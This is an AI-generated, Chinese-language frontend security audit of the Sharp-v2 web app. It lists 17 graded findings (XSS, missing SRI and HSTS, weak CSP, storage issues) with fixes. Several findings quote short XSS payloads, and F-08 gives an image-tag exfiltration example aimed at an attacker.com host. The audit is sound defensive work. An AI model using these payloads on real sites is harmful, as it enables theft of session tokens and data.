---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: '55a8d6d3-a1da-4e09-8aa3-5554d7fe9594'
  PropagateID: '55a8d6d3-a1da-4e09-8aa3-5554d7fe9594'
  ReservedCode1: '778ff974-0558-49b3-8403-756d546ad7c0'
  ReservedCode2: '778ff974-0558-49b3-8403-756d546ad7c0'
---

# Sharp-v2 前端安全审计报告

> **审计范围**：`runtime/src/sharp/server/static/` 全部前端代码
> **审计日期**：2026-09-17
> **审计人**：AI 安全审计助手
> **项目版本**：index.html `?v=71`
> **分级标准**：P0（致命）/ P1（高危）/ P2（中危）/ P3（低危）/ P4（信息）

---

## 一、审计总览

| 维度 | 文件数 | 总行数 | 发现总数 |
|------|--------|--------|----------|
| 核心 JS | 13 | ~6200 | — |
| HTML 模板 | 12（含 index.html + 11 views） | ~140000 | — |
| 第三方库 | 13 | — | — |
| 后端安全头 | 1（app.py） | 197 | — |
| **合计** | **39** | — | **17** |

### 发现汇总

| 级别 | 数量 | 编号 |
|------|------|------|
| P0（致命） | 0 | — |
| P1（高危） | 3 | F-01, F-02, F-03 |
| P2（中危） | 5 | F-04, F-05, F-06, F-07, F-08 |
| P3（低危） | 6 | F-09, F-10, F-11, F-12, F-13, F-14 |
| P4（信息） | 3 | F-15, F-16, F-17 |

---

## 二、第三方库版本清单

| 库名 | 版本 | 文件 | 许可证 |
|------|------|------|--------|
| Alpine.js | 3.15.11 | `vendor/alpine.min.js` | MIT |
| DOMPurify | 3.2.4 | `vendor/purify.min.js` | Apache-2.0 / MPL-2.0 |
| Cytoscape.js | 2016-2025 (未标精确版本号) | `vendor/cytoscape.min.js` | MIT |
| dagre | 2012-2014 (未标版本号) | `vendor/dagre.min.js` | MIT |
| webcola (cola) | 未标版本号 | `vendor/cola.min.js` | MIT |
| klay.js | 0.4.1 (build 201604131004) | `vendor/klay.js` | BSD |
| ELK (Eclipse Layout Kernel) | 2017+ (未标版本号) | `vendor/elk.bundled.js` | EPL |
| cytoscape-cola | 未标版本号 | `vendor/cytoscape-cola.js` | MIT |
| cytoscape-dagre | 未标版本号 | `vendor/cytoscape-dagre.js` | MIT |
| cytoscape-elk | 未标版本号 | `vendor/cytoscape-elk.js` | MIT |
| cytoscape-klay | 未标版本号 | `vendor/cytoscape-klay.js` | MIT |
| cytoscape-navigator | 2012-2015 | `vendor/cytoscape-navigator.js` | MIT |
| Tailwind CSS | 未标版本号 (standalone runtime) | `vendor/tailwindcss.js` | MIT |

---

## 三、后端安全头配置（app.py）

已确认 `app.py:27-43` 定义了以下安全响应头，通过 `security_headers_middleware`（`app.py:102-111`）注入所有响应：

| 安全头 | 值 | 评估 |
|--------|-----|------|
| Content-Security-Policy | `default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; font-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'self'` | 见 F-04 |
| X-Content-Type-Options | `nosniff` | 正确 |
| Referrer-Policy | `no-referrer` | 正确 |
| X-Frame-Options | `DENY` | 正确（CSP `frame-ancestors 'none'` 也是双重防护） |
| Strict-Transport-Security | **缺失** | 见 F-03 |

---

## 四、详细发现

---

### F-01 — DOMPurify 条件加载失败导致 XSS 防护失效

- **级别**：P1（高危）
- **文件**：`app.core.js:315-317`
- **代码**：
  ```javascript
  if (typeof DOMPurify !== 'undefined') {
    s = DOMPurify.sanitize(s, { ALLOWED_TAGS: ['p','br','pre','code','h2','h3','strong','em','hr','ul','ol','li'] });
  }
  ```
- **描述**：`renderMd()` 函数先自写 Markdown 解析器将文本转为 HTML，然后调用 DOMPurify 进行 sanitize。但 DOMPurify 的调用被包裹在 `typeof DOMPurify !== 'undefined'` 条件判断中。如果 `vendor/purify.min.js` 加载失败（网络问题、文件被删、CDN 不可达等），sanitize 步骤被静默跳过，`renderMd` 将返回未经净化的 HTML 字符串。
- **攻击路径**：攻击者通过 AI 对话、项目描述、证据描述等服务器返回字段注入 `<img src=x onerror=alert(document.cookie)>` 等 payload。在 DOMPurify 加载失败时，这些 payload 将通过 `x-html` 指令直接注入 DOM 执行。
- **影响**：存储型 XSS → 可窃取 sessionStorage 中的 JWT token → 账户接管。
- **影响面**：以下 7 处 `x-html="renderMd(...)"` 调用均受影响：
  - `views/chat.html:114`（AI 对话流式内容）
  - `views/chat.html:124`（AI 对话历史消息）
  - `views/graph.html:541`（证据 description）
  - `views/graph.html:578`（证据详情 description）
  - `views/graph.html:713`（行动意图 description）
  - `index.html` 报告预览区域
  - `app.projects.js:500-502`（printReport 的 `innerHTML`）
- **修复建议**：
  1. **首选**：当 `typeof DOMPurify === 'undefined'` 时，`renderMd` 应返回纯文本（仅 `escapeHtml`，不返回任何 HTML 标签），而非静默跳过 sanitize。
  2. **次选**：在 `index.html` 中将 DOMPurify 的 `<script>` 标签放在所有 app JS 之前，并添加 `onerror` 回调设置全局标志位。
  3. **纵深防御**：添加 SRI integrity 属性（见 F-02）。

---

### F-02 — 所有 `<script>` 标签缺少 SRI（Subresource Integrity）

- **级别**：P1（高危）
- **文件**：`index.html:9-19, 2015-2026`
- **描述**：全部 25 个 `<script>` 标签（11 个 vendor 库 + 12 个 app JS + 2 个 inline）均没有 `integrity` 属性和 `crossorigin` 属性。如果攻击者能够篡改任何一个 JS 文件（如通过 MITM、供应链攻击、服务器被入侵），可以注入任意恶意代码。
- **影响**：供应链攻击 → 完全控制前端 → 窃取 JWT token、篡改所有数据。
- **加剧因素**：CSP 中 `script-src 'self'` 仅限制来源域，但不防止文件内容被篡改。SRI 是文件完整性校验的唯一前端措施。
- **修复建议**：
  1. 为所有 vendor 库和 app JS 生成 SRI hash（`openssl dgst -sha384 -binary file.js | openssl base64 -A`）。
  2. 添加 `integrity="sha384-..."` 和 `crossorigin="anonymous"` 属性。
  3. 若考虑版本迭代时 SRI 更新的维护成本，至少为 vendor 库（版本稳定的第三方文件）添加 SRI。

---

### F-03 — 缺少 HSTS（HTTP Strict-Transport-Security）头

- **级别**：P1（高危）
- **文件**：`app.py:27-43`（`_SECURITY_HEADERS` 字典）
- **描述**：后端安全头中间件未设置 `Strict-Transport-Security` 响应头。如果应用通过 HTTPS 部署（生产环境通常如此），缺少 HSTS 意味着浏览器不会强制使用 HTTPS，用户首次访问或后续访问可能被降级为 HTTP，暴露于 SSL 剥离/中间人攻击。
- **影响**：SSL stripping → 中间人攻击 → token 窃取。
- **修复建议**：在 `_SECURITY_HEADERS` 中添加：
  ```python
  "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
  ```
  注意：仅在确认生产环境使用 HTTPS 时添加，否则会导致 HTTP 环境无法访问。

---

### F-04 — CSP 包含 `'unsafe-inline'` 和 `'unsafe-eval'`

- **级别**：P2（中危）
- **文件**：`app.py:28-39`
- **描述**：CSP 的 `script-src` 指令包含 `'unsafe-inline' 'unsafe-eval'`。这是因为：
  - Alpine.js 使用 `Function` 构造器求值模板表达式（需要 `unsafe-eval`）
  - Tailwind standalone runtime 注入 `<style>`（需要 `style-src 'unsafe-inline'`）
  - `index.html` 中有两段 inline `<script>`（需要 `script-src 'unsafe-inline'`）
- **影响**：CSP 无法阻止 inline script 注入。XSS 防护完全依赖 DOMPurify 白名单（见 F-01）。如果 DOMPurify 失效，CSP 不能提供纵深防御。
- **代码注释**（`app.py:21-26`）已明确说明此取舍：CSP 防护重点是「禁止加载外部脚本 / 禁止被嵌套 / 禁止表单外发 / 禁止 object 与 base 劫持」，inline 注入防护靠 DOMPurify。
- **修复建议**：
  1. **长期方案**：将 Alpine.js 和 Tailwind 替换为构建期产物（如 Vite 编译），使用 CSP nonce 替代 `unsafe-*`。
  2. **短期方案**：将 `index.html` 中的 2 段 inline `<script>` 移至外部 JS 文件。

---

### F-05 — `printReport()` 中 `innerHTML` 使用未经净化的标题

- **级别**：P2（中危）
- **文件**：`app.projects.js:500-503`
- **代码**：
  ```javascript
  const title = this.reportPreview.title || 'AI 报告';
  area.innerHTML = `
    <div class="print-meta"><strong>${title}</strong> · 导出时间：${now}</div>
    <div class="md-body">${this.renderMd(content)}</div>
  `;
  ```
- **描述**：`title` 变量直接插入 `innerHTML` 模板字符串，未经 `escapeHtml()` 处理。`reportPreview.title` 来源于服务器返回的报告标题（可能基于用户输入的项目名称生成）。如果标题中包含 HTML 特殊字符（如 `<script>alert(1)</script>` 或 `<img onerror=...>`），将被注入 DOM。
- **影响**：存储型 XSS（需服务端未对标题做转义）。在 DOMPurify 加载正常时，由于 `title` 不经过 `renderMd`/DOMPurify，仍可被利用。
- **修复建议**：
  ```javascript
  area.innerHTML = `
    <div class="print-meta"><strong>${this.escapeHtml(title)}</strong> · 导出时间：${now}</div>
    <div class="md-body">${this.renderMd(content)}</div>
  `;
  ```

---

### F-06 — Android Chat 会话信息存储在 localStorage

- **级别**：P2（中危）
- **文件**：`app.analyzers.js:418, 656`；`app.core.js:588`
- **代码**：
  ```javascript
  // app.analyzers.js:656
  localStorage.setItem('sharp_android_chat', JSON.stringify({
    sessionId: ..., apkPath: ...
  }));
  ```
- **描述**：Android 分析的会话信息（包含 `sessionId` 和 `apkPath`）存储在 `localStorage` 中，关闭标签页后不会自动清除。`sessionId` 可用于后续 API 调用，`apkPath` 暴露了服务器端文件路径。
- **影响**：
  1. localStorage 数据在浏览器中持久存在，即使关闭标签页也不清除。
  2. 若发生 XSS，攻击者可读取 `sessionId` 和 `apkPath`。
  3. 在共享设备场景下，后续用户可看到前一个用户的会话残留。
- **修复建议**：将 Android Chat 会话信息迁移到 `sessionStorage`（与 token 存储策略一致），或在会话结束时主动清除。

---

### F-07 — API 错误信息直接暴露给用户

- **级别**：P2（中危）
- **文件**：`app.core.js:174-178`
- **代码**：
  ```javascript
  if (!r.ok) {
    let msg = `HTTP ${r.status}`;
    if (typeof data.detail === 'string') msg = data.detail;
    else if (Array.isArray(data.detail)) msg = data.detail.map(e => e.msg).join('; ');
    throw new Error(msg);
  }
  ```
- **描述**：API 请求失败时，直接将服务端返回的 `data.detail` 错误信息展示给用户。FastAPI 在出现未处理异常时会返回包含内部实现细节的错误信息（如文件路径、SQL 语句、库版本号等），可能泄露系统架构信息。
- **影响**：信息泄露 → 辅助攻击者了解后端实现 → 制定更精准的攻击策略。
- **修复建议**：
  1. 后端层面（优选）：生产环境关闭 FastAPI 的 `debug` 模式，统一异常处理中间件返回通用错误信息。
  2. 前端层面：对 500 类错误显示通用提示（"服务器内部错误，请稍后重试"），仅在开发环境展示详细错误。

---

### F-08 — CSP `img-src` 允许 `https:` 通配

- **级别**：P2（中危）
- **文件**：`app.py:32`
- **代码**：
  ```python
  "img-src 'self' data: blob: https:;"
  ```
- **描述**：`img-src` 允许从任意 HTTPS 源加载图片。攻击者可利用此通道进行数据外泄（如通过 `<img src="https://attacker.com/steal?data=xxx">` 将敏感数据作为 URL 参数发送）或跟踪用户行为。虽然 CSP 的 `connect-src 'self'` 限制了 `fetch`/`XMLHttpRequest` 的目标，但 `img-src https:` 开辟了另一条数据外泄通道。
- **影响**：数据外泄（需配合 XSS 或 HTML 注入点）。
- **修复建议**：将 `img-src` 收窄为 `'self' data: blob:`，除非有明确的业务需求加载外部图片。

---

### F-09 — 缺少 CSRF 防护（风险因 Bearer Token 认证而降低）

- **级别**：P3（低危）
- **文件**：全局（无 CSRF token、无 XSRF header、无 SameSite cookie 配置）
- **描述**：前端没有任何 CSRF 防护措施。但由于认证使用 Bearer JWT（通过 `Authorization` header 传递，而非 Cookie），CSRF 攻击需要知道有效 token 才能构造请求，因此实际风险较低。
- **残余风险**：
  1. 如果将来引入 Cookie-based 认证（如 SSO 集成），CSRF 风险将急升至 P1。
  2. `fetchText()`（`app.core.js:183-194`）部分调用未显式设置 `Content-Type`，浏览器可能自动附加 Cookie。
- **修复建议**：
  1. 当前状态可接受，但应在代码注释或文档中明确记录"依赖 Bearer Token 防 CSRF"的设计决策。
  2. 若引入 Cookie 认证，需同步添加 CSRF token + `SameSite=Strict` cookie。

---

### F-10 — SVG 图表通过 `x-html` 注入（内部数据，低风险）

- **级别**：P3（低危）
- **文件**：`views/dashboard.html:86, 113`
- **代码**：
  ```html
  <div x-html="vulnDonutSvg()"></div>
  <div x-html="vulnTrendSvg()"></div>
  ```
- **描述**：`vulnDonutSvg()` 和 `vulnTrendSvg()` 函数返回 SVG 字符串，通过 `x-html` 注入 DOM。这些 SVG 中的数据来源于服务端返回的漏洞统计（数量、严重程度等）。
- **影响**：如果服务端返回的漏洞统计数据被篡改为包含恶意 SVG 内联事件（如 `<svg onload=alert(1)>`），可能触发 XSS。但实际利用需要控制服务端返回的数值字段。
- **修复建议**：在 `vulnDonutSvg()` / `vulnTrendSvg()` 内部对数值进行 `parseInt()` / `Number()` 强制类型转换后再拼入 SVG 字符串。

---

### F-11 — 部分定时器/监听器清理不完整

- **级别**：P3（低危）
- **文件**：多处
- **描述**：
  | 资源 | 文件 | 清理情况 |
  |------|------|----------|
  | `_heartbeatTimer` (setInterval) | `app.core.js:69` | 已清理 (`app.core.js:109`) |
  | `pollTimer` (setInterval) | `app.core.js:67` (startPolling) | 已清理 (`app.core.js:110`) |
  | `pollTimer` (setInterval) | `app.project-detail.js:432` | **未在 destroy() 中显式清理** |
  | `_projectSse` (AbortController) | `app.project-detail.js:455` | 已清理 (`app.project-detail.js:529`) |
  | `_panelResizeMove` (event listener) | `app.core.js:59` | 已清理 (`app.core.js:104`) |
  | `_keydownHandler` (event listener) | `app.core.js:98` | 已清理 (`app.core.js:107`) |
  | `_hashChangeHandler` (event listener) | `app.core.js:71` | 已清理 (`app.core.js:106`) |
  | Cytoscape 实例 (cy) | `app.graph.js` | 已清理 (`cy.destroy()`) |
  | Cytoscape navigator | `app.graph.js:114-115` | 已清理 |
  | Chat AbortController | `app.chat.js:107-108` | 已清理 (`app.chat.js:163-165`) |
  | Android Chat AbortController | `app.analyzers.js:549-550` | 已清理 (`app.analyzers.js:610-611`) |
  | `fitTimer` (setTimeout) | `app.graph.js:673` | **未在组件销毁时清理** |
  | `replay.timer` (setTimeout) | `app.replay.js:55` | **仅在 stop 时清理，组件销毁时未清理** |
  
- **影响**：内存泄漏。在频繁切换项目、切换视图时，未清理的定时器和事件监听器会累积，导致内存占用持续增长。
- **修复建议**：在项目切换/组件销毁路径中补充 `clearInterval(this.pollTimer)`、`clearTimeout(fitTimer)`、`clearTimeout(this.replay.timer)` 的清理逻辑。

---

### F-12 — 多处 `catch(_)` 静默忽略错误

- **级别**：P3（低危）
- **文件**：多处（`app.core.js:22`, `app.core.js:30`, `app.core.js:37`, `app.project-detail.js:529`, `app.graph.js:115` 等约 15 处）
- **描述**：大量 `catch(_)` 或 `catch(_) {}` 静默忽略异常。虽然部分场景合理（如 `sessionStorage` 在隐私模式下不可用时的降级），但部分场景可能掩盖真实错误：
  - `app.project-detail.js:529`：SSE 断开时 `try { this._projectSse.abort(); } catch (_) {}` — 若 abort 失败，用户不知道 SSE 连接异常。
  - `app.graph.js:115`：`try { this._navigator.destroy(); } catch (_) {}` — 若 navigator destroy 失败，可能残留 DOM 引用。
- **影响**：问题排查困难，潜在异常被掩盖。
- **修复建议**：对关键路径的 `catch` 块添加 `console.warn` 日志，保留降级行为但增加可观测性。

---

### F-13 — Token 旧版 localStorage 迁移逻辑残留风险

- **级别**：P3（低危）
- **文件**：`app.core.js:16-20`
- **代码**：
  ```javascript
  const legacy = localStorage.getItem(SHARP_TOKEN_KEY);   // 旧版遗留，迁移后清除
  if (legacy) {
    sessionStorage.setItem(SHARP_TOKEN_KEY, legacy);
    localStorage.removeItem(SHARP_TOKEN_KEY);
    return legacy;
  }
  ```
- **描述**：首次加载时，如果 `localStorage` 中存在旧版 token，会先将其复制到 `sessionStorage` 再从 `localStorage` 删除。在复制和删除之间的极短时间窗口内，token 同时存在于两个存储中。如果此窗口内发生 XSS，攻击者可从 `localStorage` 读取 token。
- **影响**：极低概率的 token 泄露窗口（仅在首次迁移时存在，且需要精确时机的 XSS）。
- **修复建议**：当前迁移逻辑是为了兼容旧版用户体验（不被登出），可接受。建议在后续版本中移除此迁移逻辑（当所有用户都已升级后）。

---

### F-14 — 前端路由缺少项目访问权限验证

- **级别**：P3（低危）
- **文件**：`app.core.js:115-126`
- **描述**：`handleRoute()` 解析 `#/projects/:id` 哈希路由后，直接调用 `this.openProject(id)` 打开项目。前端未验证当前用户是否有权访问该项目（仅检查了 `authToken` 是否存在）。虽然后端 API 会做权限校验，但前端缺乏预检查会导致：
  1. 无权限项目的数据不会返回，但 UI 会先渲染项目框架再显示错误。
  2. 攻击者可通过枚举项目 ID 探测项目是否存在（通过观察错误响应差异）。
- **影响**：信息泄露（项目 ID 枚举）+ 用户体验问题。
- **修复建议**：后端 API 应对无权限访问返回统一的 404（而非 403），防止信息泄露。前端可在 `openProject()` 中捕获 403/404 并显示友好提示。

---

### F-15 — 前端无速率限制机制

- **级别**：P4（信息）
- **文件**：全局
- **描述**：前端没有对 API 调用实施任何客户端侧速率限制。虽然后端应负责真正的速率限制，但前端缺少基本的防抖/节流措施可能导致：
  1. 用户快速点击操作按钮触发大量重复请求。
  2. 自动轮询（`startPolling`）频率固定，无法根据网络状况自适应调整。
- **影响**：无直接安全风险，但可能增加后端负载，间接影响可用性。
- **修复建议**：对高频操作（如审批按钮、项目创建）添加前端防抖。后端应实现真正的 API 速率限制。

---

### F-16 — `downloadExportFile` 文件名注入风险

- **级别**：P4（信息）
- **文件**：`app.projects.js:509`
- **代码**：
  ```javascript
  const name = (projectTitle || projectId).replace(/[/\\?%*:|"<>]/g, '_').slice(0, 60);
  ```
- **描述**：下载报告时，文件名基于 `projectTitle` 生成，已通过正则替换移除了文件系统危险字符。正则覆盖了 `/ \ ? % * : | " < >`，基本足够。但未过滤换行符 `\n` 和回车符 `\r`，在某些操作系统中可能导致文件名异常。
- **影响**：极低风险，仅影响文件名显示。
- **修复建议**：在正则中添加 `\n\r`，或使用更严格的白名单方式（仅允许字母数字、中文、下划线、连字符）。

---

### F-17 — 前端安全响应头依赖后端注入

- **级别**：P4（信息）
- **文件**：`index.html`（无 CSP meta 标签）
- **描述**：所有安全响应头（CSP、X-Frame-Options 等）均由后端 `security_headers_middleware` 注入，`index.html` 中没有任何 `<meta http-equiv="...">` 形式的安全头声明。这意味着：
  1. 如果 `index.html` 被直接以文件方式打开（`file://`），所有安全头不生效。
  2. 如果中间件配置错误或被绕过，前端没有兜底防护。
- **影响**：纵深防御缺失。
- **修复建议**：在 `index.html` `<head>` 中添加 CSP meta 标签作为兜底：
  ```html
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; ...">
  ```
  注意：meta CSP 不能包含 `frame-ancestors` 和 `report-uri`，且与 HTTP 头同时存在时取最严格组合。

---

## 五、安全亮点（做得好的方面）

1. **Token 存储策略**：JWT 存储在 `sessionStorage` 而非 `localStorage`，关闭标签页即失效，显著缩小了 token 暴露窗口（`app.core.js:1-38`）。旧版 localStorage token 有自动迁移清除逻辑。

2. **DOMPurify 白名单严格**：`renderMd` 的 DOMPurify `ALLOWED_TAGS` 仅包含 11 个格式化标签，排除了所有危险标签（`script`, `iframe`, `img`, `svg`, `a` 等）（`app.core.js:316`）。

3. **API 统一封装**：所有 API 调用通过 `api()` 方法统一处理认证 header、超时、401 自动登出。`fetchText()` 和少数 `fetch` 调用虽绕过 `api()` 但仍手动添加 Bearer 头。

4. **SSE 使用 fetch + ReadableStream**：而非 `EventSource`，可携带 `Authorization` header 认证。有 AbortController 支持的断线重连（最多 3 次指数退避）。

5. **CSP 基础配置**：`default-src 'self'`、`object-src 'none'`、`base-uri 'none'`、`frame-ancestors 'none'`、`form-action 'self'` 均为安全最佳实践。

6. **资源清理**：`destroy()` 方法系统性清理了事件监听器、定时器、SSE 连接、Cytoscape 实例。大部分异步操作使用 AbortController 可控取消。

7. **escapeHtml 函数完备**：覆盖了 `& < > " '` 五个字符（`app.core.js:926-933`），用于 YAML 高亮等场景。

8. **Auth Gate**：`init()` 方法有明确的认证门控，未登录时不渲染任何应用内容。

9. **请求超时**：所有 API 调用有超时机制（默认 30s，长耗时端点 600s），使用 `AbortSignal.timeout()` 原生 API。

---

## 六、修复优先级建议

### 第一批（P1，建议立即修复）

| 编号 | 问题 | 预估工时 | ROI |
|------|------|----------|-----|
| F-01 | DOMPurify 条件加载失败 | 0.5h | 极高 — 消除 XSS 防护单点失效 |
| F-02 | Script 标签缺少 SRI | 1h | 高 — 供应链攻击纵深防御 |
| F-03 | 缺少 HSTS | 0.1h | 高 — 一行配置，效果显著 |

### 第二批（P2，建议近期修复）

| 编号 | 问题 | 预估工时 | ROI |
|------|------|----------|-----|
| F-05 | printReport innerHTML 未转义 | 0.2h | 高 — 一行代码修复 |
| F-06 | Android Chat localStorage | 1h | 中 — 迁移到 sessionStorage |
| F-07 | API 错误信息暴露 | 2h | 中 — 需后端配合 |
| F-08 | CSP img-src 过宽 | 0.1h | 中 — 一行配置，需验证无业务影响 |
| F-04 | CSP unsafe-* | 8h+ | 低 — 需架构改造（长期） |

### 第三批（P3，建议排期修复）

| 编号 | 问题 | 预估工时 | ROI |
|------|------|----------|-----|
| F-11 | 定时器/监听器清理 | 1h | 中 — 内存稳定性 |
| F-10 | SVG x-html 注入 | 0.5h | 中 — 数值类型转换 |
| F-12 | catch 静默忽略 | 1h | 低 — 可观测性 |
| F-09 | CSRF（当前可接受） | — | 低 — 记录设计决策 |
| F-13 | Token 迁移残留 | 0h | 低 — 后续版本移除 |
| F-14 | 路由权限验证 | 1h | 低 — 后端为主 |

---

## 七、审计覆盖度矩阵

| 审计维度 | 覆盖文件数 | 覆盖度 | 备注 |
|----------|-----------|--------|------|
| XSS / DOMPurify | 全部 JS + HTML | 完整 | 7 处 x-html + 1 处 innerHTML |
| Token 存储 | app.core.js | 完整 | sessionStorage + localStorage 迁移 |
| CSRF | 全局 | 完整 | 确认无 CSRF 防护，Bearer Token 降低风险 |
| API 调用安全 | app.core.js | 完整 | api() + fetchText() + 独立 fetch |
| SSE/WebSocket 安全 | app.project-detail.js, app.chat.js, app.analyzers.js | 完整 | fetch+SSE，Bearer 认证，AbortController |
| 前端路由安全 | app.core.js | 完整 | hash 路由 + auth gate |
| 代码质量 / 内存管理 | 全部 JS | 完整 | 定时器/监听器/SSE/Cytoscape 清理 |
| 第三方依赖 | 13 个 vendor 库 | 完整 | 版本号 + SRI 检查 |
| 后端安全头 | app.py | 完整 | CSP + X-Frame + X-Content-Type + Referrer-Policy |
| localStorage 非 Token 数据 | 全部 JS | 完整 | 21 处 localStorage 调用 |
| 错误处理 | app.core.js | 完整 | API 错误 + catch 静默忽略 |
| 资源清理 / 内存泄漏 | 全部 JS | 完整 | 28 处 cleanup/destroy 调用 |

---

## 八、结论

Sharp-v2 前端在安全方面整体处于**中等偏上**水平。关键亮点是 token 存储已从 localStorage 迁移至 sessionStorage、DOMPurify 白名单严格、CSP 基础配置合理。最关键的风险点集中在 **DOMPurify 条件加载失败（F-01）**——这是当前 XSS 防护链中的单点失效，一旦 DOMPurify 未加载成功，整个 `renderMd` 管线将返回未净化的 HTML，且 CSP 因 `unsafe-inline` 无法兜底。建议优先修复 F-01/F-02/F-03 三项 P1 问题，总工时约 1.5h，可显著提升前端安全基线。

> AI生成